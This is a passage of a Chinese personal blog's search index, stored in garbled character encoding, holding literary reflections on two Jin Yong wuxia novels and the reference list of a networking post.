è…¾è®¯äº‘ (tencent.com)\n[4] å½­å¨œ.å¹¶è¡ŒTCPåœ¨å¹¿åŸŸç½‘åŠ é€Ÿç³»ç»Ÿä¸­çš„ç ”ç©¶ä¸å®ç°[C].ä¸­å—å¤§å­¦ç¡•å£«å­¦ä½è®ºæ–‡,2009-05\n[5] https://sourceforge.net/projects/wanem/files/Documents/WANemv11-Setup-Guide.pdf/\n","date":"2021-11-23T00:00:00Z","permalink":"https://xrg.fj.cn/p/tcp%E5%8A%A0%E9%80%9F%E4%B9%8B%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BAwanem/","title":"TCPåŠ é€Ÿä¹‹ç¯å¢ƒæ­å»ºï¼ˆWANemï¼‰"},{"content":"è·ç¦»æˆ‘åºŸå¯å¿˜é£Ÿåœ°è¯»å®Œã€Šå€šå¤©å± é¾™è®°ã€‹ä¸åˆ°ä¸¤å‘¨ï¼Œæˆ‘åˆä»¥ç›¸åŒçš„çƒ­æƒ…è¯»å®Œäº†ã€Šè¿åŸè¯€ã€‹ã€‚\nè‡ªæˆ‘è¯»å®Œã€Šå€šå¤©ã€‹ä¹‹åï¼Œä¾¿æš—è‡ªä¸‹å†³å¿ƒå°‘è¯»é‡‘åº¸å°è¯´ï¼Œç¬¬ä¸€æ˜¯å› ä¸ºé‡‘åº¸å…ˆç”Ÿçš„å°è¯´å®åœ¨å†™å¾—ç²¾å½©ï¼Œå¾ˆå®¹æ˜“ä½¿æˆ‘ä¸å»åšå…¶ä»–äº‹æƒ…è€Œä¸“é—¨æ¥è¯»ï¼Œç¬¬äºŒæ˜¯é‡‘åº¸å…ˆç”Ÿçš„å°è¯´æ€»æ˜¯åŒ…å«å¾ˆæ·±é•¿çš„æ„å‘³ï¼Œè¯»å®Œä¹‹åæ€»æ˜¯å¦‚é¥®çƒˆé…’ï¼Œæ€ç»ªéœ‡è¡ã€‚\næˆ‘åœ¨ä¸­å­¦æ—¶å‡ ä¹è¯»éäº†é‡‘åº¸å°è¯´ï¼Œæœ€å–œæ¬¢çš„å‡ æœ¬ä¸­ä¾¿æœ‰ä¸€æœ¬ã€Šè¿åŸè¯€ã€‹ã€‚è¯»å®Œã€Šå€šå¤©ã€‹ä¹‹åä¾¿æŠŠã€Šè¿åŸè¯€ã€‹åŠ å…¥åˆ°æˆ‘çš„ç”µå­ä¹¦åº“ä¸­ï¼Œä¸å‡ºåå¤©ï¼Œä¾¿ç¿»å¼€äº†ç¬¬ä¸€é¡µï¼Œç¿»å¼€ä¹‹åï¼Œä¸¤å¤©çš„æ—¶é—´å†…ä¾¿æ•´æœ¬è¯»å®Œäº†ã€‚\nã€Šè¿åŸè¯€ã€‹å‡ ä¹æ˜¯é‡‘åº¸å°è¯´ä¸­æœ€ç°å®çš„ä¸€æœ¬ï¼Œå®ƒçš„æƒ…èŠ‚ä¹‹å‹æŠ‘ï¼Œä»¤äººè§‰å¾—è‡ªå·±ä»¿ä½›ä¸æ˜¯åœ¨è¯»æ­¦ä¾ å°è¯´ã€‚å°è¯´æ·‹æ¼“å°½è‡´åœ°å±•ç°äº†äººæ€§ä¸­çš„â€è´ªâ€œï¼Œå™è¿°äº†ç”±è´ªå¿µå¼•å‡ºçš„ä¸€ç³»åˆ—ä¸å…¬å¹³äº‹ï¼Œå‡ ä¹æ˜¯ç›´æŒ‡ç€è‹å¤©çš„é¼»å­ï¼Œè´¨é—®ç€ä½•ä¸ºâ€å–„æœ‰å–„æŠ¥ï¼Œæ¶æœ‰æ¶æŠ¥â€œã€‚\næ•…äº‹çš„æ ¸å¿ƒæ­£æ˜¯ã€Šè¿åŸè¯€ã€‹ï¼Œè¿™æ˜¯ä¸€æœ¬æ­¦åŠŸç§˜ç±ï¼Œä¹Ÿæ˜¯ä¸€ä»½å·¨å¤§å®è—çš„ç´¢å¼•ã€‚ç„¶è€Œï¼Œä¸»è§’ç‹„äº‘çš„æ‚²æƒ¨å‘½è¿çš„èµ·ç‚¹ï¼Œä¸è¿™æœ¬ä¹¦å¹¶æ— å…³ç³»ã€‚å¸ˆå¾’ä¸‰äººä»ä¹¡ä¸‹æ¥åˆ°ä¸‡éœ‡å±±çš„å®¶ä¸­ä¸ºä»–è´ºå¯¿ï¼Œä¸‡å®¶å…«åå¼Ÿå­å¯¹æˆšèŠ³è§è‰²èµ·æ„ï¼Œè®¾è®¡å°†ç‹„äº‘é™·å®³æˆå¼ºå¥¸æœªé‚çš„æ·«å¾’ï¼Œä½¿ä»–å³æ‰‹äº”æŒ‡è¢«å‰Šã€ç©¿äº†çµç¶éª¨ã€å…³å…¥æ­»å›šç‹±ä¸­ã€‚åœ¨è¿™é‡Œï¼Œç‹„äº‘è®¤è¯†äº†ä¸å…¸ï¼Œå½“ç‹„äº‘çŸ¥é“å¸ˆå¦¹å°†è¦å«ç»™ä»‡äººä¹‹åï¼Œè¯•å›¾è‡ªæ€ï¼Œä»æ­¤å–å¾—äº†ä¸å…¸çš„ä¿¡ä»»ã€‚ç‹„äº‘åˆæ­¥ä¹ å¾—äº†ä¸å…¸çš„ã€Šç¥ç…§ç»ã€‹ï¼Œè€Œåœ¨ä¸€ä¸ªé›¨å¤œä¸­ï¼Œä¸å…¸æ„è¯†åˆ°è‡ªå·±æ·±çˆ±çš„å¥³å­å·²ç»é€ä¸–ï¼Œå¸¦ç€ç‹„äº‘è¶Šç‹±å‰å»ç¡®è®¤å¥¹çš„æ­»æ´»ï¼Œå—åˆ°äº†çŸ¥åºœå‡Œé€€æ€çš„æš—ç®—ï¼Œäº¦è¸ä¸Šäº†é»„æ³‰ã€‚ç‹„äº‘æ‰¿æ¥äº†ä¸å…¸ä¸å‡Œéœœååˆè‘¬çš„é—æ„¿ï¼Œå¼€å¯äº†æ±Ÿæ¹–ä¸Šçš„æ¸¸è¡ç”Ÿæ¶¯ã€‚ä»–å¸¦ç€ä¸å…¸çš„å°¸èº«åœ¨æœºç¼˜å·§åˆä¸‹æ¥åˆ°ä¸‡å®¶ï¼Œè§åˆ°äº†æˆšèŠ³ï¼Œä¸ä¸‡åœ­å†²çªï¼Œè¢«æˆšèŠ³æ‰€æ•‘ï¼Œåˆå—åˆ°å®è±¡åƒ§çš„è¿½å‡»ï¼Œåœ¨ç ´å¯ºä¸­ä¾¥å¹¸æ¯’æ­»å®è±¡ï¼Œç«åŒ–äº†ä¸å…¸ï¼Œåˆé‡åˆ°é“ƒå‰‘åŒä¾ å’Œè¡€åˆ€è€ç¥–ï¼Œè¢«ä¸€ç³»åˆ—å·§åˆè£¹æŒŸç€æ¥åˆ°è¥¿åŸŸé›ªè°·ï¼Œçœ¼è§è¡€åˆ€è€ç¥–å‡»è´¥æ±Ÿå—ä¸‰ä¾ ã€å—åˆ°è¡€åˆ€è€ç¥–çš„æ¯’æ‰‹ã€å†²å¼€ä»»ç£äºŒè„‰ã€ä¸èŠ±é“å¹²å’Œæ°´ç¬™å‘¨æ—‹ã€æœ€ç»ˆä¼—äººè¿›å…¥é›ªè°·ã€ä¸æ°´ç¬™ä¸€åŒé­åˆ°ä¼—äººçš„è¯¯ä¼šã€å¼€å¯äº†æ–°ä¸€æ®µçš„æ¼‚æ³Šã€‚æ•…äº‹è¿›å…¥æœ€åä¸€å¤§éƒ¨åˆ†ï¼Œæ˜¯ç‹„äº‘ä»é›ªè°·ä¸­å‡ºæ¥ä¹‹åï¼Œè§åˆ°è¨€è¾¾å¹³ã€è§£æ•‘ä¸‡åœ­ã€ä¸æˆšèŠ³åŒæ—¶çŸ¥æ™“ä¸‡å®¶çš„æ¯’è®¡ã€çœ¼è§æˆšèŠ³æ­»äº¡ã€è¿½å¯»è¨€è¾¾å¹³æ¥åˆ°å®è—æ‰€åœ¨çš„åœ°æ–¹ã€çœ¼è§ä¼—äººå› ä¸ºæŠ¢å¤ºè´¢å®è€Œå…¨éƒ¨æ­»ä¼¤ã€æœ€åä¸‡å¿µä¿±ç°å›åˆ°äº†é›ªè°·ï¼Œè§åˆ°äº†æ°´ç¬™ã€‚æˆ‘åœ¨ä¸­å­¦æ—¶å€™ï¼Œæ­£æ˜¯å¤©çœŸçƒ‚æ¼«çš„å¹´çºªï¼Œå¯¹ç”šä¹ˆæ˜äº‰æš—æ–—çš„æƒ…èŠ‚å®Œå…¨æ²¡æœ‰ä»»ä½•çš„ç†è§£ï¼Œåªè§‰å¾—æ°´ç¬™å¯¹ç‹„äº‘ä»æœ€åˆçš„åŒæ¶ã€åˆ°è¯¯ä¼šçš„æ¶ˆé™¤ã€å†åˆ°æœ€åè§åˆ°ç‹„äº‘çš„æ¬£å–œï¼Œè¿™æ ·çš„è½¬å˜çœŸæ˜¯ä»¤äººéå¸¸æ¬£æ…°çš„ï¼Œå› æ­¤å¯¹è¿™ä¸€éƒ¨ä¹¦è¿˜è›®å–œæ¬¢ï¼›å¦‚ä»Šï¼Œæˆ‘ä»å‰æ‰€è§‰å¾—æ— å…³ç´§è¦çš„é‚£äº›æƒ…èŠ‚ï¼Œçªç„¶å˜å¾—æ— æ¯”çœŸå®ã€æ— æ¯”è¡€æ·‹æ·‹çš„ï¼Œä»å‰æœ€æ¬¢å–œçš„æƒ…èŠ‚ï¼Œå€’æˆä¸ºäº†ä¸¤ä¸ªè’™å—å¤§å†¤ä¹‹äººçš„ä¸€ç¬”ç®€å•ç»“å°¾ï¼Œå¹¶ä¸ååˆ†åœ°ä»¤äººæŒ¯å¥‹äº†ã€‚\nç°ä¸‹è¯»æ¥ï¼Œæ•´ä¸ªæ•…äº‹åŸºæœ¬æ²¡æœ‰ä»¤äººå¤§æ„Ÿæ„‰æ‚¦çš„éƒ¨åˆ†ï¼Œæ²¡æœ‰å¿«æ„æ©ä»‡ã€æ²¡æœ‰è¡Œä¾ ä»—ä¹‰ã€æ²¡æœ‰ç”·å¥³æš§æ˜§ã€æ²¡æœ‰å®¶å›½æƒ…æ€€ï¼Œã€Šè¿åŸè¯€ã€‹å°±æ˜¯å•çº¯åœ°æå†™äº†ä¼—äººå¦‚ä½•å—åˆ°å¿ƒä¸­è´ªå¿µçš„é©±ä½¿ã€è€ŒåŠ å…¥ä¸€åœºåœºç‹ æ¯’çš„æš—ç®—ã€é—¹å“„å“„çš„æŠ¢å¤ºä¸­ã€‚åœ¨è¿™ä¸€ç¯å¥—ä¸€ç¯çš„å¿ƒè®¡ä¸‹ï¼Œå…¨ä¹¦ä¸­æœ€æ†¨åšè€å®çš„ç‹„äº‘å—åˆ°äº†æ— æ•°ä¸æ˜ä¸ç™½çš„å†¤å±ˆï¼Œä¸”æœ€ç»ˆä¹Ÿæ²¡æœ‰æ­£å¼åœ°å°†è¿™äº›å†¤å±ˆæ´—æ¸…ã€‚å…¶å®ï¼Œåœ¨ç‹„äº‘å¿ƒä¸­ï¼Œè¿™äº›å†¤å±ˆçš„æ´—æ¸…ï¼Œå¤§æŠµå·²ç»ä¸é‡è¦äº†ï¼Œä»–å¿ƒçˆ±æ•¬é‡çš„äººä¸€ä¸ªæ¥ä¸€ä¸ªåœ°æ­»å»ã€æˆ–æ˜¾éœ²å‡ºç‹°ç‹çš„é¢è²Œï¼Œä¸€ä¸ªäººå—åˆ°æ‰“å‡»å¦‚æ­¤ï¼Œå¦‚ä½•è¿˜ä¼šå»åœ¨æ„ä¸‡ä¸¤é»„é‡‘ã€æ²‰å†¤æ˜­é›ªå‘¢ï¼Ÿ\nä¸çŸ¥åœ¨å“ªé‡Œè§åˆ°è¿‡ä¸€å¥è¯ï¼šâ€œã€Šè¿åŸè¯€ã€‹æ˜¯é‡‘åº¸å°è¯´ä¸­æœ€ä¸ºç°å®ä¸»ä¹‰çš„ä¸€éƒ¨â€ã€‚çš„ç¡®ï¼Œç›¸æ¯”äºæ­£æ°”å‡›ç„¶ã€å–„æ¶å¾—æŠ¥çš„å…¶ä»–æ­¦ä¾ ä½œå“ï¼Œè¿™éƒ¨ä¹¦ä¸­åªæœ‰æ— å°½çš„æš—ç®—å’Œå†¤å±ˆï¼Œä½¿å¾—è¯»è€…ä¸ç¦è¦è´¨é—®ä¸Šè‹ï¼šè¿™æ ·çš„ä¸–ç•Œä½ ä¸è¦ç®¡ç®¡ä¹ˆï¼Ÿç„¶è€Œè´¨é—®æ˜¯æ— åŠ›çš„ï¼Œæˆ‘ä»¬åœ¨ç°å®çš„ä¸–ç•Œä¸­ï¼Œä½•å°å°‘äº†å‹¾å¿ƒæ–—è§’ã€æ˜æªæš—ç®­ï¼Œä½•å°è§åˆ°äººæ¶å¤©æ”¶ã€äººå–„å¤©ä½‘å‘¢ï¼Ÿç›¸æ¯”äºæˆ‘ä»ã€Šå€šå¤©å± é¾™è®°ã€‹ä¸­è¯»åˆ°çš„å®¶å›½ã€å–„æ¶ã€ç”·å¥³ç­‰ç­‰ä¸€ç³»åˆ—çš„ä¸»é¢˜ï¼Œã€Šè¿åŸè¯€ã€‹çš„ä¸»é¢˜å¯å•è°ƒè®¸å¤šï¼Œå•åªæœ‰ä»äººæ€§ä¸­çš„â€è´ªâ€œæ‰€å¼•å‘çš„æ€è€ƒï¼Œå…¶æ·±è¿œå’Œåˆ†é‡å´æ¯«ä¸é€Šè‰²äº†ã€‚\n","date":"2021-10-22T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E5%86%8D%E8%AF%BB%E8%BF%9E%E5%9F%8E%E8%AF%80/","title":"å†è¯»ã€Šè¿åŸè¯€ã€‹"},{"content":"æ¦‚è¨€ ã€Šå€šå¤©å± é¾™è®°ã€‹æ˜¯ä¸€éƒ¨å¥½ä½œå“ã€‚\nè·ç¦»ä¸Šä¸€ç¯‡è¯»ä¹¦å°è®°å·²æœ‰åŠå¹´å¤šäº†ï¼Œè¿™åŠå¹´å¹¶éå…¨æ— è¯»ä¹¦ï¼Œè€Œæ˜¯è¯»äº†å¤§éƒ¨å¤´è€Œè¿˜æœªè¯»å®Œï¼ˆã€Šä¸‰å›½æ¼”ä¹‰ã€‹ï¼‰ï¼Œæˆ–è€…è¯»äº†è®ºè¿°ç±»çš„ä¹¦ï¼ˆã€Šä¹¡åœŸä¸­å›½ã€‹ï¼‰è€Œå°šæœªç†è§£å¾—å¾ˆæ·±åˆ»ï¼Œè‡ªç„¶æ²¡æœ‰åŠæ³•äº§å‡ºä»€ä¹ˆè¯»ä¹¦æ„Ÿæƒ³ã€‚\nå…¶å®ï¼Œæˆ‘ä»ä»¥å‰å°±è¯´æˆ‘ä¸å¤§å–œæ¬¢è¯»å°è¯´ï¼Œå°¤å…¶æ˜¯é•¿ç¯‡å°è¯´ï¼Œè¿™ç‚¹åé¢ä¸€å®šè¦è®²è®²ã€‚\nè¨€å½’æ­£ä¼ ï¼Œä»æˆ‘å†ä¸€æ¬¡ç¿»å¼€ã€Šå€šå¤©å± é¾™è®°ã€‹ï¼Œåˆ°æˆ‘çœ‹å®Œæœ€åä¸€é¡µè€Œæ— æ¯”æ€…ç„¶ï¼ŒåªèŠ±äº†ä¸‰å››å¤©çš„æ—¶é—´ã€‚çŠ¹è®°å¾—ä¸­å­¦æ—¶æœŸï¼Œå­¦æ ¡æ€»æ˜¯å¼ºè°ƒä¸è¦çœ‹æ­¦ä¾ å°è¯´ï¼Œç”šè‡³åœ¨æ­¦ä¾ å°è¯´ä¹‹å‰åŠ ä¸Šäº†â€œæ²‰è¿·â€äºŒå­—ï¼Œä¿¨ç„¶å°†å…¶è§†ä¸ºäº†ä¸€ç§çŒ›çƒˆä¸Šç˜¾çš„æ¯’è¯ï¼›è¿™å‡ å¤©ä¸‹æ¥ï¼Œé¢‡ä¸è®¤åŒã€‚å°è¯´å°±æ˜¯å°è¯´ï¼Œå°è¯´éƒ½æ˜¯å†™äººç‰©çš„ã€è®²æ•…äº‹çš„ï¼Œä¸åº”æœ‰â€œæ²‰è¿·æŸæŸå°è¯´â€è¿™ç§é’ˆå¯¹æ€§çš„è¡¨è¾¾ã€‚æ‰€è°“â€œæ²‰è¿·â€ï¼Œåªèƒ½æ˜¯ä½œè€…æŠŠäººç‰©å†™å¾—å¤ªç”ŸåŠ¨äº†ï¼ŒæŠŠæ•…äº‹è®²å¾—å¤ªç²¾å½©äº†ï¼Œä½¿è¯»è€…æµè¿äºå°è¯´çš„ä¸–ç•Œä¹‹ä¸­ï¼Œä½†æ˜¯æ—¢ç„¶å¦‚æ­¤ï¼Œâ€œæ²‰è¿·â€æ­¦ä¾ å°è¯´ï¼Œå’Œâ€œæ²‰è¿·â€å››å¤§åè‘—ã€â€œæ²‰è¿·â€å¤–å›½ç»å…¸ï¼Œä¹Ÿå°±æ²¡æœ‰å¤šå¤§çš„åŒºåˆ«äº†ã€‚\næˆ‘å…ˆè¯´â€œæ²‰è¿·â€æ­¦ä¾ å°è¯´çš„è¯´æ³•æ˜¯é”™è¯¯çš„ï¼Œä½†æˆ‘è¿™å‡ å¤©ç¡®å®æ˜¯â€œæ²‰è¿·â€äº†ï¼Œæ²‰è¿·åœ¨åœ¨è¿™ç‰‡å¿«æ„æ©ä»‡çš„æ±Ÿæ¹–é‡Œï¼Œç”šè‡³æ²¡æœ‰å¿ƒæ€æŠ½å‡ºèº«æ¥æ‰“æ‰“æ¸¸æˆã€‚\næˆ‘æƒ³ã€Šå€šå¤©å± é¾™è®°ã€‹ä¹‹ç²¾å½©ï¼Œå…¶ä¸€åœ¨äºâ€œå¤§æƒ…â€å’Œâ€œå°æƒ…â€çš„è°ƒå’Œï¼Œè¿™æ˜¯æ–‡æ„æ–¹é¢ï¼›å…¶äºŒåœ¨äºé‡‘åº¸å…ˆç”Ÿå¯¹äººç‰©çš„å¡‘é€ ï¼Œä¸€ä¸ªä¸ªè§’è‰²éƒ½æ˜¯æœ‰è¡€æœ‰è‚‰çš„ï¼Œä»–ä»¬çš„å¬‰ç¬‘æ€’éª‚å¦‚åœ¨çœ¼å‰ï¼Œè¯»è€…å¹¶ä¸æ˜¯ä»¥å†·é…·çš„ç¬¬ä¸‰è€…çš„èº«ä»½æ¥çœ‹å®Œæ•´ç¯‡æ•…äº‹ï¼Œè€Œæ˜¯ä»¿ä½›è·Ÿéšåœ¨è¿™äº›äººç‰©èº«è¾¹å»ç›®ç¹ä¸€åˆ‡äº†ã€‚\nä¸­å­¦æ—¶çœ‹è¿‡å‡ éã€Šå€šå¤©å± é¾™è®°ã€‹ï¼Œä½†å¹´å²æ¸é•¿ï¼Œå¿ƒå¢ƒä¹Ÿä¸åŒå¾€æ—¥ã€‚æ—§æ—¶çš„è®°å¿†åªé™äºè·Ÿå¼ æ— å¿Œç›¸å…³çš„éƒ¨åˆ†ï¼Œè¿™æ¬¡é‡è¯»ï¼ŒåŠç”ŸåŠç†Ÿä¹‹é—´è‡ªç„¶æœ‰æ–°çš„æ„Ÿæ‚Ÿã€‚\nå…¨ä¹¦å¯ä»¥åˆ†ä¸ºå‡ ä¸ªå¤§çš„éƒ¨åˆ†ï¼Œå¼ æ— å¿Œæˆå¹´ä»¥å‰çš„éƒ¨åˆ†å‡ä¸ºé“ºå«ï¼Œå¼ ç¿ å±±å’Œæ®·ç´ ç´ ç›¸è¯†ç›¸æ‹ã€å†°ç«å²›ç­‰æƒ…èŠ‚å°¤å…¶ç²¾å½©ï¼›å¼ æ— å¿Œå›å½’ä¸­åœŸä¹‹åï¼Œå¹¼å¹´æ—¶æœŸçš„æƒ…èŠ‚å•åˆ—ä¸€éƒ¨åˆ†ï¼Œæ­¤æ—¶çš„æ— å¿Œå®Œæˆäº†ä»å¤©çœŸçº¯ç²¹åˆ°åˆå°ä¸–äº‹çš„è½¬å˜ï¼Œä»–çˆ¶æ¯çš„è‡ªå°½ã€èº«å—ç„å†¥ç¥æŒä¹‹åè¢«å¤ªå¸ˆå‚…å¸¦ç€å››å¤„æ±‚åŒ»ã€è´è¶è°·çš„ç”Ÿæ´»ã€å¸¦ç€ä¸æ‚”å¦¹å¦¹çš„æ¼«æ¼«è¥¿è¡Œä¹‹è·¯ã€å—äº†æœ±å®¶çš„æ¬ºéª—â€¦â€¦èº«å¤„ä¹±ä¸–ï¼Œè¿™æ ·çš„ç»å†ä¸å¯ä¸è°“å‘½é€”å¤šèˆ›ï¼Œä½†å¼ æ— å¿Œå§‹ç»ˆæ‰¿å—ä¸‹æ¥äº†ï¼Œä¸€æ¬¡æ¬¡çš„ç£¨ç ºéƒ½å¸¦ç€ä¸€æ¬¡æ¬¡çš„æœºç¼˜ï¼Œä¸å‘¨èŠ·è‹¥çš„ç›¸è¯†ã€ä¸€èº«åŒ»æœ¯çš„ä¿®æˆï¼Œéƒ½åœ¨æ­¤æ—¶ã€‚\nç¬¬ä¸‰éƒ¨åˆ†æ˜¯å…‰æ˜é¡¶è§£å›´ã€‚ä¿®æˆä¹é˜³ç¥åŠŸä¹‹åï¼Œåœ¨å…‰æ˜é¡¶ç»“è¯†å°æ˜­ã€ç»ƒæˆä¹¾å¤å¤§æŒªç§»ã€åŠ›æœå…­å¤§æ´¾ï¼Œè€Œæˆä¸ºæ˜æ•™æ•™ä¸»ã€‚è¿™éƒ¨åˆ†æ˜¯å¼ æ— å¿Œäººç”Ÿä¸­çš„ç¬¬ä¸€ä¸ªé«˜å…‰ï¼Œå®åˆ™ä¹Ÿæ˜¯å…¨ä¹¦ä¸­â€œå¤§æƒ…â€çš„ç¬¬ä¸€æ¬¡ä½“ç°ï¼šå­¦æ­¦ä¹‹äººåº”å½“èƒ¸è¥Ÿå¼€é˜”ï¼Œæ±Ÿæ¹–å„æ´¾åº”è¯¥ç²¾è¯šå›¢ç»“ã€å…±å…‹å¤–æ•Œã€‚å…‰æ˜é¡¶ä¸€æˆ˜ï¼Œæ— äººä¸æœè¿™ä¸€å¹´è½»è€Œé«˜å°šçš„ä¾ å£«ã€‚\nç¬¬å››éƒ¨åˆ†æ˜¯è§£æ•‘ç¾¤é›„ã€‚å…‰æ˜é¡¶ä¹‹åï¼Œè’™å¤åŠ¿åŠ›ä»‹å…¥æ¡æ¼ï¼Œå„å¤§æ´¾äººç‰©ä¸ºèµµæ•æ‰€æ“’ã€‚å¼ æ— å¿Œå…ˆåˆ°å°‘æ—ï¼Œååˆ°æ­¦å½“ï¼Œäºæ­¦å½“å±±é¡¶å­¦ä¼šäº†å¤ªæï¼Œååˆ†æ¼‚äº®åœ°è§£äº†ä¸€æ¬¡å›´ã€‚è€Œåä¸‡å®å¯ºä¸€æˆ˜ï¼Œæ•‘å‡ºç¾¤è±ªï¼Œä¹Ÿæ˜¯ç²¾å½©ã€‚è¿™ä¸€éƒ¨åˆ†ï¼Œå¼ æ— å¿Œä¸èµµæ•ç›¸è¯†ï¼Œè€Œåæƒ…æ„«æš—ç”Ÿï¼Œæˆä¸ºå…¨æ–‡â€œå°æƒ…â€çš„é‡è¦éƒ¨åˆ†ã€‚è¿™ä¸€éƒ¨åˆ†æ˜¯å‘¨èŠ·è‹¥å‘½è¿çš„è½¬æŠ˜ç‚¹ï¼Œç”±äºç­ç»å¸ˆå¤ªå¿ƒä¸­é‚£æ— æ³•æ”¾ä¸‹çš„æˆè§ï¼Œä½¿å¾—ä¸€ä½å°‘å¥³æ—©æ—©ç»“æŸäº†å¥¹å¤©çœŸå¯çˆ±çš„æ—¶æœŸï¼Œè€Œè¢«è¿«ä¿®ç»ƒåŸåºœï¼Œç»ˆäºå¸¦æ¥ä¸€åœºå‡Œä¹±çš„å†²çªï¼Œååˆ†å¯æ‚²å¯å¹ã€‚\nç¬¬äº”éƒ¨åˆ†æ˜¯å‡ºæµ·ä¸å½’æ¥ã€‚å¼ æ— å¿Œä¸€è¡Œäººå‰å¾€çµè›‡å²›ï¼Œåœ¨é‚£å²›ä¸Šå¯»å¾—è°¢é€Šã€ä¸æ³¢æ–¯æ€»æ•™äº§ç”ŸçŸ›ç›¾ã€ä¸å°æ˜­ä¸œè¥¿æ°¸éš”ã€å›ç¨‹æ—¶æ®·ç¦»èº«æ­»ã€èµµæ•å—å†¤â€¦â€¦è¿™éƒ¨åˆ†æ˜¯â€œå°æƒ…â€çš„ä¸»èˆå°ï¼Œå¼ æ— å¿Œä¸å››ä¸ªå¥³å­ä¹‹é—´å‰ªä¸æ–­ç†è¿˜ä¹±çš„æƒ…æ„Ÿï¼Œä½¿å¾—æˆ‘åœ¨çœ‹è¿™ä¸€éƒ¨åˆ†æ—¶ç›¸å½“ç—›è‹¦ã€‚ä¸æ³¢æ–¯äººçš„å†²çªæœ€ç»ˆè¿˜æ˜¯ç¨é€Šä¸€ç­¹ï¼Œå°æ˜­è¢«è¿«æˆä¸ºæ€»æ•™æ•™ä¸»ï¼Œè¿œèµ´æ³¢æ–¯ï¼Œä»æ­¤æ°¸åˆ«ï¼ˆåœ¨å°è¯´ä¸­æ°¸åˆ«äº†ï¼‰ï¼Œæ®·ç¦»èº«æ­»ã€èµµæ•è’™å†¤ï¼Œå¼ æ— å¿Œçš„æƒ…æ„Ÿèšç„¦åˆ°äº†å‘¨èŠ·è‹¥å’Œè°¢é€Šèº«ä¸Šã€‚æˆ‘å…ˆå‰å·²è¯´äº†ï¼Œæ‰€è°“â€œæ²‰è¿·â€å…¶ä¸­ï¼Œæ˜¯æŒ‡æƒ…èŠ‚å’Œè¯­è¨€ç²¾å½©ç»ä¼¦ï¼Œä½¿è¯»è€…å¦‚åŒç›®ç¹ä¸€åˆ‡ï¼Œæ„Ÿå—ä¸€åˆ‡ï¼›ç„¶åˆ™æˆ‘ä¹Ÿäº²å†äº†å¼ æ— å¿Œä¸å››å¥³çš„æƒ…æ„Ÿæ³¢æŠ˜ï¼Œå››æ®µæ„Ÿæƒ…è¿«äºå¤–åŠ›ä¸€æ®µæ®µåœ°ç»ˆäº†ï¼Œæœ€ç»ˆå‰©ä¸‹ä¸å‘¨èŠ·è‹¥çš„æƒ…æ„Ÿï¼Œä¹Ÿæ²¡æœ‰ä¸€ä¸ªæ¸…æ™°çš„ç•Œå®šï¼ŒçœŸæ˜¯æ„æ­»äººä¹Ÿã€‚\nç¬¬äº”éƒ¨åˆ†æ˜¯å†å›ä¸­åœŸä¹‹åï¼Œä¸å‘¨èŠ·è‹¥çš„å†²çªã€ä¸èµµæ•çš„é‡é€¢ã€å¤šæ¬¡è¥æ•‘è°¢é€Šã€å…±æŠ—å…ƒå…µã€æºæ‰‹å½’éšã€‚è¿™éƒ¨åˆ†æ˜¯æ–‡ç« çš„æœ€åä¸€éƒ¨åˆ†ï¼Œä¹Ÿæ˜¯â€œå¤§æƒ…â€å’Œâ€œå°æƒ…â€çš„é«˜æ½®ã€‚åœ¨è¿™éƒ¨åˆ†ï¼Œå¼ æ— å¿Œå°†â€œå°æƒ…â€ç†å‡ºäº†å¤´ç»ªï¼Œå³å…ˆä¹‰çˆ¶ã€åç”·å¥³ï¼Œä¸»èµµæ•ã€å‰¯ä»–äººã€‚ä¸ºæ•‘ä¹‰çˆ¶ï¼Œä¸æƒœä¸èµµæ•ä¸€åŒç¦»å¼€å©šç¤¼ç°åœºï¼Œä¸å‘¨èŠ·è‹¥å½»åº•å†²çªï¼›è€Œéšç€è¥æ•‘è¿›ç¨‹çš„å‘å±•ï¼Œæ— å¿Œä¹Ÿè®¤æ¸…äº†è‡ªå·±å¿ƒä¸­çœŸæ­£æ‰€çˆ±çš„è§’è‰²æ˜¯èµµæ•ã€‚è¿™éƒ¨åˆ†æ˜¯å…¨æ–‡ä¸­ç¬¬äºŒæ¬¡èšé›†å¤©ä¸‹è‹±æ°ï¼Œå…ƒå…µçš„åˆ°æ¥ä¹Ÿä½¿å¾—æ­¦æ—äººå£«ç²¾è¯šå›¢ç»“ã€å…±æŠ—å¤–æ•Œï¼Œæ˜¯â€œå¤§æƒ…â€çš„åˆä¸€æ¬¡é›†ä¸­è¡¨è¾¾ã€‚\nå¤§æƒ… æˆ‘è®¤ä¸ºä¸€ç¯‡å°è¯´å½“ä¸­ä¸åº”è¯¥åªæœ‰å°æƒ…ã€‚\nè¿™é‡Œçš„å¤§æƒ…ï¼Œæ˜¯æŒ‡å¯¹äººç‰©å…³ç³»ä¹‹å¤–çš„ã€æ›´é«˜ä¸€çº§çš„é—®é¢˜çš„æ€è€ƒå’Œä½“ç°ã€‚ã€Šå€šå¤©å± é¾™è®°ã€‹å½“ä¸­è‡³å°‘ä½“ç°äº†ä¸¤ä¸ªæ·±åˆ»çš„é—®é¢˜ï¼š\næ­£ä¸é‚ªçš„å¯¹ç«‹ç»Ÿä¸€ã€‚ ä¸»ä¸æ¬¡çš„çŸ›ç›¾å†²çªã€‚ ä»å¼ ç¿ å±±å’Œæ®·ç´ ç´ çš„å…³ç³»å¼€å§‹ï¼Œå°±åœ¨è¡¨è¾¾ä¸€ä¸ªé—®é¢˜ï¼šæ­£ä¸é‚ªæ˜¯ç»å¯¹å¯¹ç«‹çš„å—ï¼Ÿæ®·ç´ ç´ æ˜¯å¤©é¹°æ•™çš„å…¬ä¸»ï¼ŒåŸæœ¬æ€äººä¸çœ¨çœ¼ï¼Œä½†ä¸ºæƒ…æ‰€åŠ¨ï¼Œæˆä¸ºäº†ä¸€ä¸ªæ¸©æŸ”çš„å¦»å­ã€æ¸©æŸ”çš„æ¯äº²ï¼Œè¿™æ ·çš„äººï¼Œèƒ½ç§°ä¹‹ä¸ºé‚ªå—ï¼Ÿ\nè°¢é€Šçš„è½¬å˜ï¼Œèµµæ•çš„è½¬å˜ï¼Œå‡æ˜¯é‚ªè½¬ä¸ºæ­£çš„ä¾‹å­ï¼›ä½•å¤ªå†²åŸæœ¬ä¹Ÿæ˜¯ä¸€æ´¾æŒé—¨ï¼Œè´ªå¿µä¸€èµ·ï¼Œä¾¿å§‹ç»ˆçº ç»“äºè°¢é€Šä¸å± 